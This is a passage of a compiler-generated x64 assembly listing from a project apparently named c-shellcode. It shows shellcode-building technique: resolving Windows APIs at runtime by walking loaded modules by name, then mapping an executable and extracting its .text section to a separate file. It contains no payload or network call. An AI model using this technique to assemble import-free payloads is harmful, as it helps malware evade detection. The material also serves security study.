    mov rsp, rsi ; Restore the original value of RSP
    pop rsi ; Restore RSI
    ret ; Return to caller
AlignRSP ENDP



hFile$ = 64
sectionSize$ = 72
bytesWritten$ = 76
hFileWrite$ = 80
hMapping$ = 88
result$ = 96
exeBase$ = 104
textSection$ = 112
fileSize$ = 120
wideBuffer$1 = 128
main	PROC
; File C:\Users\6lady\source\shel0101\shell3124\c-shellcode.cpp
; Line 310
$LN14:
	push	rdi
	sub	rsp, 256				; 00000100H
; Line 312
	call	?InitializeFunctions@@YA_NXZ		; InitializeFunctions
; Line 314
	xor	r9d, r9d
	lea	r8, OFFSET $SG90746
	lea	rdx, OFFSET $SG90747
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 316
	mov	QWORD PTR [rsp+48], 0
	mov	DWORD PTR [rsp+40], 128			; 00000080H
	mov	DWORD PTR [rsp+32], 3
	xor	r9d, r9d
	xor	r8d, r8d
	mov	edx, -2147483648			; 80000000H
	lea	rcx, OFFSET ?fileName@@3PADA	; fileName
	call	QWORD PTR ?_CreateFileA@@3P6APEAXPEBDKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@ZEA ; _CreateFileA
	mov	QWORD PTR hFile$[rsp], rax
; Line 325
	cmp	QWORD PTR hFile$[rsp], -1
	jne	SHORT $LN2@main
; Line 326
	xor	r9d, r9d
	lea	r8, OFFSET $SG90749
	lea	rdx, OFFSET $SG90750
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 327
	mov	eax, 5
	jmp	$LN1@main
$LN2@main:
; Line 330
	xor	r9d, r9d
	lea	r8, OFFSET $SG90751
	lea	rdx, OFFSET $SG90752
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 332
	mov	QWORD PTR [rsp+32], 0
	lea	r9, OFFSET ?bytesRead@@3KA		; bytesRead
	mov	r8d, 63					; 0000003fH
	lea	rdx, OFFSET ?buffer@@3PADA		; buffer
	mov	rcx, QWORD PTR hFile$[rsp]
	call	QWORD PTR ?_ReadFile@@3P6AHPEAX0KPEAKPEAU_OVERLAPPED@@@ZEA ; _ReadFile
	mov	DWORD PTR result$[rsp], eax
; Line 333
	xor	r9d, r9d
	lea	r8, OFFSET $SG90753
	lea	rdx, OFFSET $SG90754
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
	npad	1
; Line 334
	cmp	DWORD PTR result$[rsp], 0
	je	SHORT $LN3@main
	cmp	DWORD PTR ?bytesRead@@3KA, 0		; bytesRead
	jbe	SHORT $LN3@main
; Line 336
	mov	eax, DWORD PTR ?bytesRead@@3KA		; bytesRead
	lea	rcx, OFFSET ?buffer@@3PADA		; buffer
	mov	BYTE PTR [rcx+rax], 0
; Line 338
	lea	rax, QWORD PTR wideBuffer$1[rsp]
	mov	rdi, rax
	xor	eax, eax
	mov	ecx, 128				; 00000080H
	rep stosb
; Line 339
	mov	DWORD PTR [rsp+40], 64			; 00000040H
	lea	rax, QWORD PTR wideBuffer$1[rsp]
	mov	QWORD PTR [rsp+32], rax
	mov	r9d, DWORD PTR ?bytesRead@@3KA		; bytesRead
	lea	r8, OFFSET ?buffer@@3PADA		; buffer
	xor	edx, edx
	xor	ecx, ecx
	call	QWORD PTR ?_MultiByteToWideChar@@3P6AHIKPEBDHPEA_WH@ZEA ; _MultiByteToWideChar
; Line 340
	xor	r9d, r9d
	lea	r8, OFFSET $SG90757
	lea	rdx, QWORD PTR wideBuffer$1[rsp]
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
	npad	1
; Line 341
	jmp	SHORT $LN4@main
$LN3@main:
; Line 343
	xor	r9d, r9d
	lea	r8, OFFSET $SG90758
	lea	rdx, OFFSET $SG90759
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
	npad	1
$LN4@main:
; Line 346
	mov	rcx, QWORD PTR hFile$[rsp]
	call	QWORD PTR ?_CloseHandle@@3P6AHPEAX@ZEA	; _CloseHandle
; Line 348
	xor	r9d, r9d
	lea	r8, OFFSET $SG90760
	lea	rdx, OFFSET $SG90761
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 349
	mov	QWORD PTR [rsp+48], 0
	mov	DWORD PTR [rsp+40], 128			; 00000080H
	mov	DWORD PTR [rsp+32], 3
	xor	r9d, r9d
	xor	r8d, r8d
	mov	edx, -2147483648			; 80000000H
	lea	rcx, OFFSET ?fileName@@3PADA	; fileName
	call	QWORD PTR ?_CreateFileA@@3P6APEAXPEBDKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@ZEA ; _CreateFileA
	mov	QWORD PTR hFile$[rsp], rax
; Line 358
	cmp	QWORD PTR hFile$[rsp], -1
	jne	SHORT $LN5@main
; Line 359
	xor	r9d, r9d
	lea	r8, OFFSET $SG90763
	lea	rdx, OFFSET $SG90764
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 360
	mov	eax, 5
	jmp	$LN1@main
$LN5@main:
; Line 363
	xor	r9d, r9d
	lea	r8, OFFSET $SG90765
	lea	rdx, OFFSET $SG90766
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 365
	xor	edx, edx
	mov	rcx, QWORD PTR hFile$[rsp]
	call	QWORD PTR ?_GetFileSize@@3P6AKPEAXPEAK@ZEA ; _GetFileSize
	mov	DWORD PTR fileSize$[rsp], eax
; Line 367
	xor	r9d, r9d
	lea	r8, OFFSET $SG90767
	lea	rdx, OFFSET $SG90768
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 369
	mov	QWORD PTR [rsp+40], 0
	mov	DWORD PTR [rsp+32], 0
	xor	r9d, r9d
	mov	r8d, 2
	xor	edx, edx
	mov	rcx, QWORD PTR hFile$[rsp]
	call	QWORD PTR ?_CreateFileMappingA@@3P6APEAXPEAXPEAU_SECURITY_ATTRIBUTES@@KKKPEBD@ZEA ; _CreateFileMappingA
	mov	QWORD PTR hMapping$[rsp], rax
; Line 370
	cmp	QWORD PTR hMapping$[rsp], 0
	jne	SHORT $LN6@main
; Line 371
	xor	r9d, r9d
	lea	r8, OFFSET $SG90770
	lea	rdx, OFFSET $SG90771
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 372
	mov	rcx, QWORD PTR hFile$[rsp]
	call	QWORD PTR ?_CloseHandle@@3P6AHPEAX@ZEA	; _CloseHandle
; Line 373
	mov	eax, 1
	jmp	$LN1@main
$LN6@main:
; Line 376
	xor	r9d, r9d
	lea	r8, OFFSET $SG90772
	lea	rdx, OFFSET $SG90773
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 378
	mov	QWORD PTR [rsp+32], 0
	xor	r9d, r9d
	xor	r8d, r8d
	mov	edx, 4
	mov	rcx, QWORD PTR hMapping$[rsp]
	call	QWORD PTR ?_MapViewOfFile@@3P6APEAXPEAXKKK_K@ZEA ; _MapViewOfFile
	mov	QWORD PTR exeBase$[rsp], rax
; Line 379
	cmp	QWORD PTR exeBase$[rsp], 0
	jne	SHORT $LN7@main
; Line 380
	xor	r9d, r9d
	lea	r8, OFFSET $SG90775
	lea	rdx, OFFSET $SG90776
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 381
	mov	rcx, QWORD PTR hMapping$[rsp]
	call	QWORD PTR ?_CloseHandle@@3P6AHPEAX@ZEA	; _CloseHandle
; Line 382
	mov	rcx, QWORD PTR hFile$[rsp]
	call	QWORD PTR ?_CloseHandle@@3P6AHPEAX@ZEA	; _CloseHandle
; Line 383
	mov	eax, 1
	jmp	$LN1@main
$LN7@main:
; Line 386
	xor	r9d, r9d
	lea	r8, OFFSET $SG90777
	lea	rdx, OFFSET $SG90778
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 388
	mov	DWORD PTR sectionSize$[rsp], 0
; Line 389
	lea	rdx, QWORD PTR sectionSize$[rsp]
	mov	rcx, QWORD PTR exeBase$[rsp]
	call	?GetTextSection@@YAPEAXPEAXPEAK@Z	; GetTextSection
	mov	QWORD PTR textSection$[rsp], rax
; Line 390
	cmp	QWORD PTR textSection$[rsp], 0
	je	SHORT $LN8@main
; Line 391
	xor	r9d, r9d
	lea	r8, OFFSET $SG90781
	lea	rdx, OFFSET $SG90782
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
	npad	1
; Line 392
	jmp	SHORT $LN9@main
$LN8@main:
; Line 394
	xor	r9d, r9d
	lea	r8, OFFSET $SG90783
	lea	rdx, OFFSET $SG90784
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
	npad	1
$LN9@main:
; Line 398
	xor	r9d, r9d
	lea	r8, OFFSET $SG90785
	lea	rdx, OFFSET $SG90786
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 401
	mov	rcx, QWORD PTR exeBase$[rsp]
	call	QWORD PTR ?_UnmapViewOfFile@@3P6AHPEBX@ZEA ; _UnmapViewOfFile
; Line 402
	xor	r9d, r9d
	lea	r8, OFFSET $SG90787
	lea	rdx, OFFSET $SG90788
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 405
	mov	rcx, QWORD PTR hMapping$[rsp]
	call	QWORD PTR ?_CloseHandle@@3P6AHPEAX@ZEA	; _CloseHandle
; Line 406
	xor	r9d, r9d
	lea	r8, OFFSET $SG90789
	lea	rdx, OFFSET $SG90790
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 408
	mov	rcx, QWORD PTR hFile$[rsp]
	call	QWORD PTR ?_CloseHandle@@3P6AHPEAX@ZEA	; _CloseHandle
; Line 409
	xor	r9d, r9d
	lea	r8, OFFSET $SG90791
	lea	rdx, OFFSET $SG90792
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 412
	mov	QWORD PTR [rsp+48], 0
	mov	DWORD PTR [rsp+40], 128			; 00000080H
	mov	DWORD PTR [rsp+32], 2
	xor	r9d, r9d
	xor	r8d, r8d
	mov	edx, -1073741824			; c0000000H
	lea	rcx, OFFSET $SG90793
	call	QWORD PTR ?_CreateFileA@@3P6APEAXPEBDKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@ZEA ; _CreateFileA
	mov	QWORD PTR hFileWrite$[rsp], rax
; Line 413
	cmp	QWORD PTR hFileWrite$[rsp], -1
	jne	SHORT $LN10@main
; Line 414
	xor	r9d, r9d
	lea	r8, OFFSET $SG90795
	lea	rdx, OFFSET $SG90796
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 415
	mov	eax, 6
	jmp	$LN1@main
$LN10@main:
; Line 418
	xor	r9d, r9d
	lea	r8, OFFSET $SG90797
	lea	rdx, OFFSET $SG90798
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 421
	mov	DWORD PTR bytesWritten$[rsp], 0
; Line 422
	mov	QWORD PTR [rsp+32], 0
	lea	r9, QWORD PTR bytesWritten$[rsp]
	mov	r8d, DWORD PTR sectionSize$[rsp]
	mov	rdx, QWORD PTR textSection$[rsp]
	mov	rcx, QWORD PTR hFileWrite$[rsp]
	call	QWORD PTR ?_WriteFile@@3P6AHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@ZEA ; _WriteFile
	test	eax, eax
	jne	SHORT $LN11@main
; Line 423
	xor	r9d, r9d
	lea	r8, OFFSET $SG90800
	lea	rdx, OFFSET $SG90801
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 424
	mov	rcx, QWORD PTR hFileWrite$[rsp]
	call	QWORD PTR ?_CloseHandle@@3P6AHPEAX@ZEA	; _CloseHandle
; Line 425
	mov	eax, 7
	jmp	SHORT $LN1@main
$LN11@main:
; Line 429
	mov	eax, DWORD PTR sectionSize$[rsp]
	cmp	DWORD PTR bytesWritten$[rsp], eax
	je	SHORT $LN12@main
; Line 430
	xor	r9d, r9d
	lea	r8, OFFSET $SG90803
	lea	rdx, OFFSET $SG90804
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
	npad	1
$LN12@main:
; Line 434
	mov	rcx, QWORD PTR hFileWrite$[rsp]
	call	QWORD PTR ?_CloseHandle@@3P6AHPEAX@ZEA	; _CloseHandle
; Line 435
	xor	r9d, r9d
	lea	r8, OFFSET $SG90805
	lea	rdx, OFFSET $SG90806
	xor	ecx, ecx
	call	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA ; _MessageBoxW
; Line 437
	mov	rcx, QWORD PTR hFileWrite$[rsp]
	call	QWORD PTR ?_CloseHandle@@3P6AHPEAX@ZEA	; _CloseHandle
; Line 439
	xor	eax, eax
$LN1@main:
; Line 440
	add	rsp, 256				; 00000100H
	pop	rdi
	ret	0
main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
i$1 = 32
ntHeaders$ = 40
sectionHeaders$ = 48
dosHeader$ = 56
exeBase$ = 80
sectionSize$ = 88
?GetTextSection@@YAPEAXPEAXPEAK@Z PROC			; GetTextSection
; File C:\Users\6lady\source\shel0101\shell3124\c-shellcode.cpp
; Line 280
$LN9:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H
; Line 285
	mov	rax, QWORD PTR exeBase$[rsp]
	mov	QWORD PTR dosHeader$[rsp], rax
; Line 286
	mov	rax, QWORD PTR dosHeader$[rsp]
	movzx	eax, WORD PTR [rax]
	cmp	eax, 23117				; 00005a4dH
	je	SHORT $LN5@GetTextSec
; Line 287
	xor	eax, eax
	jmp	$LN1@GetTextSec
$LN5@GetTextSec:
; Line 291
	mov	rax, QWORD PTR dosHeader$[rsp]
	movsxd	rax, DWORD PTR [rax+60]
	mov	rcx, QWORD PTR exeBase$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR ntHeaders$[rsp], rax
; Line 292
	mov	rax, QWORD PTR ntHeaders$[rsp]
	cmp	DWORD PTR [rax], 17744			; 00004550H
	je	SHORT $LN6@GetTextSec
; Line 293
	xor	eax, eax
	jmp	$LN1@GetTextSec
$LN6@GetTextSec:
; Line 297
	mov	rax, QWORD PTR ntHeaders$[rsp]
	movzx	eax, WORD PTR [rax+20]
	mov	rcx, QWORD PTR ntHeaders$[rsp]
	lea	rax, QWORD PTR [rcx+rax+24]
	mov	QWORD PTR sectionHeaders$[rsp], rax
; Line 300
	mov	DWORD PTR i$1[rsp], 0
	jmp	SHORT $LN4@GetTextSec
$LN2@GetTextSec:
	mov	eax, DWORD PTR i$1[rsp]
	inc	eax
	mov	DWORD PTR i$1[rsp], eax
$LN4@GetTextSec:
	mov	rax, QWORD PTR ntHeaders$[rsp]
	movzx	eax, WORD PTR [rax+6]
	cmp	DWORD PTR i$1[rsp], eax
	jge	SHORT $LN3@GetTextSec
; Line 301
	movsxd	rax, DWORD PTR i$1[rsp]
	imul	rax, rax, 40				; 00000028H
	mov	rcx, QWORD PTR sectionHeaders$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	r8d, 5
	lea	rdx, OFFSET $SG90727
	mov	rcx, rax
	call	QWORD PTR ?_strncmp@@3P6AHPEBD0_K@ZEA	; _strncmp
	test	eax, eax
	jne	SHORT $LN7@GetTextSec
; Line 302
	movsxd	rax, DWORD PTR i$1[rsp]
	imul	rax, rax, 40				; 00000028H
	mov	rcx, QWORD PTR sectionSize$[rsp]
	mov	rdx, QWORD PTR sectionHeaders$[rsp]
	mov	eax, DWORD PTR [rdx+rax+8]
	mov	DWORD PTR [rcx], eax
; Line 303
	movsxd	rax, DWORD PTR i$1[rsp]
	imul	rax, rax, 40				; 00000028H
	mov	rcx, QWORD PTR sectionHeaders$[rsp]
	mov	eax, DWORD PTR [rcx+rax+12]
	mov	rcx, QWORD PTR exeBase$[rsp]
	add	rcx, rax
	mov	rax, rcx
	jmp	SHORT $LN1@GetTextSec
$LN7@GetTextSec:
; Line 305
	jmp	$LN2@GetTextSec
$LN3@GetTextSec:
; Line 307
	xor	eax, eax
$LN1@GetTextSec:
; Line 308
	add	rsp, 72					; 00000048H
	ret	0
?GetTextSection@@YAPEAXPEAXPEAK@Z ENDP			; GetTextSection
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
size$ = 8
align$ = 16
?ALIGN_UP@@YAKKK@Z PROC					; ALIGN_UP
; File C:\Users\6lady\source\shel0101\shell3124\c-shellcode.cpp
; Line 275
	mov	DWORD PTR [rsp+16], edx
	mov	DWORD PTR [rsp+8], ecx
; Line 276
	mov	eax, DWORD PTR size$[rsp]
	mov	ecx, DWORD PTR align$[rsp]
	lea	eax, DWORD PTR [rax+rcx-1]
	mov	ecx, DWORD PTR align$[rsp]
	dec	ecx
	not	ecx
	and	eax, ecx
; Line 277
	ret	0
?ALIGN_UP@@YAKKK@Z ENDP					; ALIGN_UP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
shellSectionSize$ = 32
shellSection$ = 40
exeBase$ = 64
textSectionSize$ = 72
?CopyTextToShell@@YA_NPEAXK@Z PROC			; CopyTextToShell
; File C:\Users\6lady\source\shel0101\shell3124\c-shellcode.cpp
; Line 128
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
; Line 129
	mov	eax, DWORD PTR textSectionSize$[rsp]
	mov	DWORD PTR shellSectionSize$[rsp], eax
; Line 132
	mov	eax, DWORD PTR shellSectionSize$[rsp]
	mov	ecx, eax
	call	QWORD PTR ?_malloc@@3P6APEAX_K@ZEA	; _malloc
	mov	QWORD PTR shellSection$[rsp], rax
; Line 133
	cmp	QWORD PTR shellSection$[rsp], 0
	jne	SHORT $LN2@CopyTextTo
; Line 134
	xor	al, al
	jmp	SHORT $LN1@CopyTextTo
$LN2@CopyTextTo:
; Line 138
	mov	eax, DWORD PTR shellSectionSize$[rsp]
	mov	r8d, eax
	mov	rdx, QWORD PTR exeBase$[rsp]
	mov	rcx, QWORD PTR shellSection$[rsp]
	call	QWORD PTR ?_memcpy@@3P6APEAXPEAXPEBX_K@ZEA ; _memcpy
; Line 142
	mov	al, 1
$LN1@CopyTextTo:
; Line 143
	add	rsp, 56					; 00000038H
	ret	0
?CopyTextToShell@@YA_NPEAXK@Z ENDP			; CopyTextToShell
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
tv224 = 32
k32_dll$ = 40
hLibC$ = 48
base$ = 56
u32_dll$ = 64
?InitializeFunctions@@YA_NXZ PROC			; InitializeFunctions
; File C:\Users\6lady\source\shel0101\shell3124\c-shellcode.cpp
; Line 82
$LN10:
	sub	rsp, 88					; 00000058H
; Line 83
	lea	rcx, OFFSET ?kernel32_dll_name@@3PA_WA ; kernel32_dll_name
	call	?get_module_by_name@@YAPEAXPEA_W@Z	; get_module_by_name
	mov	QWORD PTR base$[rsp], rax
; Line 84
	cmp	QWORD PTR base$[rsp], 0
	jne	SHORT $LN2@Initialize
	xor	al, al
	jmp	$LN1@Initialize
$LN2@Initialize:
; Line 86
	lea	rdx, OFFSET ?load_lib_name@@3PADA	; load_lib_name
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR ?_LoadLibraryA@@3P6APEAUHINSTANCE__@@PEBD@ZEA, rax ; _LoadLibraryA
; Line 87
	lea	rdx, OFFSET ?get_proc_name@@3PADA	; get_proc_name
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA, rax ; _GetProcAddress
; Line 88
	cmp	QWORD PTR ?_LoadLibraryA@@3P6APEAUHINSTANCE__@@PEBD@ZEA, 0 ; _LoadLibraryA
	je	SHORT $LN4@Initialize
	cmp	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA, 0 ; _GetProcAddress
	jne	SHORT $LN3@Initialize
$LN4@Initialize:
	xor	al, al
	jmp	$LN1@Initialize
$LN3@Initialize:
; Line 90
	lea	rcx, OFFSET ?kr32_dll_name@@3PADA	; kr32_dll_name
	call	QWORD PTR ?_LoadLibraryA@@3P6APEAUHINSTANCE__@@PEBD@ZEA ; _LoadLibraryA
	mov	QWORD PTR k32_dll$[rsp], rax
; Line 91
	lea	rcx, OFFSET ?user32_dll_name@@3PADA ; user32_dll_name
	call	QWORD PTR ?_LoadLibraryA@@3P6APEAUHINSTANCE__@@PEBD@ZEA ; _LoadLibraryA
	mov	QWORD PTR u32_dll$[rsp], rax
; Line 92
	lea	rcx, OFFSET ?ucrtbase_dll_name@@3PADA ; ucrtbase_dll_name
	call	QWORD PTR ?_LoadLibraryA@@3P6APEAUHINSTANCE__@@PEBD@ZEA ; _LoadLibraryA
	mov	QWORD PTR hLibC$[rsp], rax
; Line 94
	cmp	QWORD PTR k32_dll$[rsp], 0
	je	SHORT $LN6@Initialize
	cmp	QWORD PTR u32_dll$[rsp], 0
	je	SHORT $LN6@Initialize
	cmp	QWORD PTR hLibC$[rsp], 0
	jne	SHORT $LN5@Initialize
$LN6@Initialize:
	xor	al, al
	jmp	$LN1@Initialize
$LN5@Initialize:
; Line 95
	lea	rdx, OFFSET $SG90686
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_CreateFileA@@3P6APEAXPEBDKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@ZEA, rax ; _CreateFileA
; Line 96
	lea	rdx, OFFSET ?get_file_size_name@@3PADA ; get_file_size_name
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_GetFileSize@@3P6AKPEAXPEAK@ZEA, rax ; _GetFileSize
; Line 97
	lea	rdx, OFFSET ?map_view_of_file_name@@3PADA ; map_view_of_file_name
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_MapViewOfFile@@3P6APEAXPEAXKKK_K@ZEA, rax ; _MapViewOfFile
; Line 98
	lea	rdx, OFFSET ?unmap_view_of_file_name@@3PADA ; unmap_view_of_file_name
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_UnmapViewOfFile@@3P6AHPEBX@ZEA, rax ; _UnmapViewOfFile
; Line 99
	lea	rdx, OFFSET ?create_file_mapping_name@@3PADA ; create_file_mapping_name
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_CreateFileMappingA@@3P6APEAXPEAXPEAU_SECURITY_ATTRIBUTES@@KKKPEBD@ZEA, rax ; _CreateFileMappingA
; Line 100
	lea	rdx, OFFSET ?rf_name@@3PADA	; rf_name
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_ReadFile@@3P6AHPEAX0KPEAKPEAU_OVERLAPPED@@@ZEA, rax ; _ReadFile
; Line 101
	lea	rdx, OFFSET ?message_box_name@@3PADA ; message_box_name
	mov	rcx, QWORD PTR u32_dll$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA, rax ; _MessageBoxW
; Line 102
	lea	rdx, OFFSET ?mb_to_wc_name@@3PADA	; mb_to_wc_name
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_MultiByteToWideChar@@3P6AHIKPEBDHPEA_WH@ZEA, rax ; _MultiByteToWideChar
; Line 103
	lea	rdx, OFFSET ?close_handle_name@@3PADA ; close_handle_name
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_CloseHandle@@3P6AHPEAX@ZEA, rax ; _CloseHandle
; Line 104
	lea	rdx, OFFSET ?strncmp_name@@3PADA	; strncmp_name
	mov	rcx, QWORD PTR hLibC$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_strncmp@@3P6AHPEBD0_K@ZEA, rax ; _strncmp
; Line 105
	lea	rdx, OFFSET $SG90687
	mov	rcx, QWORD PTR hLibC$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_strcpy_s@@3P6AHPEAD_KPEBD@ZEA, rax ; _strcpy_s
; Line 106
	lea	rdx, OFFSET $SG90688
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_ZeroMemory@@3P6AXPEAX_K@ZEA, rax ; _ZeroMemory
; Line 108
	lea	rdx, OFFSET $SG90689
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_SetFilePointer@@3P6AKPEAXJPEAJK@ZEA, rax ; _SetFilePointer
; Line 109
	lea	rdx, OFFSET $SG90690
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_SetEndOfFile@@3P6AHPEAX@ZEA, rax ; _SetEndOfFile
; Line 110
	lea	rdx, OFFSET ?malloc_name@@3PADA	; malloc_name
	mov	rcx, QWORD PTR hLibC$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_malloc@@3P6APEAX_K@ZEA, rax	; _malloc
; Line 111
	lea	rdx, OFFSET ?memcpy_name@@3PADA	; memcpy_name
	mov	rcx, QWORD PTR hLibC$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_memcpy@@3P6APEAXPEAXPEBX_K@ZEA, rax ; _memcpy
; Line 114
	lea	rdx, OFFSET $SG90691
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR ?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
	mov	QWORD PTR ?_WriteFile@@3P6AHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@ZEA, rax ; _WriteFile
; Line 115
	lea	rdx, OFFSET $SG90692
	mov	rcx, QWORD PTR k32_dll$[rsp]
